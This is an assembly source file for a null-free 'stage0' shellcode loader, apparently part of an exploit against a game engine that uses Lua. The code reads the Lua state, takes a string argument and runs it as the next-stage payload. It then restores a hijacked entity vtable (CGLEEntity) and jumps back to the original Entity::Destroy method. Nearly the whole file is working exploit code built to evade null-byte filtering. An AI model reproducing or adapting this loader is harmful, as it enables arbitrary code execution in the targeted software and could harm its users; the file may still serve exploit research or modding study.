%include 'globals.inc'

bits 32
section text
org loaderBase

;must be null free, 100bytes max!
stage0:         
        pushad
        
        mov eax, (1 << 31) | luaHandle
        shl eax, 1
        shr eax, 1
        mov ebx, [eax]           ; lua_state, save in ebx for next stages
        
        push 2
        push ebx
        mov eax, (1 << 31) | lua_tostring
        shl eax, 1
        shr eax, 1
        call [eax]
        add esp, 8
        
        call eax                ; run stage1
        
        popad
        
                                                ; restore entity obj vtable
        mov dword [ecx], (1 << 31) | 783E74h    ; CGLEEntity (XD_Plant1)
        shl dword [ecx], 1
        shr dword [ecx], 1
        mov eax, [ecx]
        jmp [eax+10h]           ; original virtual Entity::Destroy(0)